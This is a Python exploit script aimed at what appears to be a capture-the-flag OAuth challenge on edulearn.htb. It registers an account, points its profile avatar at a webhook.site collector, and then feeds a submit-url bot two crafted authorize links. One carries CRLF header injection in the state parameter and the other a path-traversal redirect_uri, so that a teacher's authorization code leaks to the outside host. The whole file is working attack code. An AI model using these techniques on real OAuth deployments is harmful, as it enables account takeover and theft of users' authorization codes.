#!/usr/bin/env python3
import re
import time
import urllib.parse

import requests

IP = "154.57.164.82"
PORT = 31059
BASE = f"http://{IP}:{PORT}"
APP = f"edulearn.htb:{PORT}"
SSO = f"sso.edulearn.htb:{PORT}"
CLIENT_ID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
WEBHOOK = "https://webhook.site/2b639f7e-5069-44a3-9232-3b22ce2b30fe/state-probe"

s = requests.Session()
email = f"debug{int(time.time())}@x.htb"
password = "password123"

def req(method, path, host, **kwargs):
    return s.request(method, BASE + path, headers={"Host": host, **kwargs.pop("headers", {})}, timeout=20, **kwargs)

r = req("POST", "/api/register", SSO, json={"email": email, "password": password, "name": "Debug User"})
print("register", r.status_code, r.text[:100])
r = req("POST", "/api/login", SSO, json={"email": email, "password": password})
print("login", r.status_code)

# Initialize Passport's dynamic public-port OAuth configuration.
r = req("GET", "/auth", APP, allow_redirects=False)
print("app auth", r.status_code, r.headers.get("location"))
auth_path = urllib.parse.urlsplit(r.headers["location"]).path + "?" + urllib.parse.urlsplit(r.headers["location"]).query
r = req("GET", auth_path, SSO, allow_redirects=False)
print("authorize normal GET", r.status_code, r.headers.get("location"))
if r.status_code == 200:
    q = urllib.parse.parse_qs(urllib.parse.urlsplit(auth_path).query)
    r = req("POST", "/oauth/authorize", SSO, data={
        "client_id": CLIENT_ID,
        "scope": "email name",
        "redirect_uri": q["redirect_uri"][0],
        "state": q.get("state", [""])[0],
        "approved": "true",
    }, allow_redirects=False)
print("authorize normal result", r.status_code, r.headers.get("location"))
callback = urllib.parse.urlsplit(r.headers["location"])
r = req("GET", callback.path + "?" + callback.query, APP, allow_redirects=False)
print("app callback", r.status_code, r.headers.get("location"))

r = req("POST", "/profile", APP, data={"displayName": "Debug User", "bio": "", "avatar": WEBHOOK}, allow_redirects=False)
print("set profile", r.status_code, r.headers.get("location"))

# Generate an unused student code at a deliberately nonexistent callback.
hold_uri = f"http://edulearn.htb:{PORT}/oauth/callback/hold"
params = urllib.parse.urlencode({"response_type": "code", "client_id": CLIENT_ID, "scope": "email name", "redirect_uri": hold_uri})
r = req("GET", "/oauth/authorize?" + params, SSO, allow_redirects=False)
print("hold authorize", r.status_code, r.headers.get("location"))
code = urllib.parse.parse_qs(urllib.parse.urlsplit(r.headers["location"]).query)["code"][0]

r = req("POST", "/submit-url", APP, data={"url": f"http://edulearn.htb:1337/oauth/callback?code={urllib.parse.quote(code, safe='')}"}, allow_redirects=False)
print("stage1", r.status_code, r.headers.get("location"))

teacher_uri = "http://edulearn.htb:1337/oauth/callback/../../profile"
teacher_params = urllib.parse.urlencode({
    "response_type": "code",
    "client_id": CLIENT_ID,
    "scope": "email name",
    "redirect_uri": teacher_uri,
    "state": "x\r\nReferrer-Policy: unsafe-url\r\nX-Probe: y",
})
r = req("POST", "/submit-url", APP, data={"url": "http://sso.edulearn.htb:1337/oauth/authorize?" + teacher_params}, allow_redirects=False)
print("stage2", r.status_code, r.headers.get("location"))
